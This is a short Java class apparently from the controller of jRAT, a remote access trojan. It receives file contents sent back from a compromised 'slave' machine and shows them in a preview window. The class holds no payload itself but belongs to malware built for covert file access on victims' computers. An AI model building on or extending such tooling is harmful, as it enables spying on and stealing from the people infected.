package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FramePreviewFile;
import java.io.DataInputStream;


public class Packet42PreviewFile extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String file = slave.readLine();
		String what = slave.readLine();
		FramePreviewFile frame = FramePreviewFile.INSTANCES.get(file);
		if (frame != null) {
			frame.getPane().getDocument().insertString(frame.getPane().getDocument().getLength(), what + "\n", null);
		}
	}

}
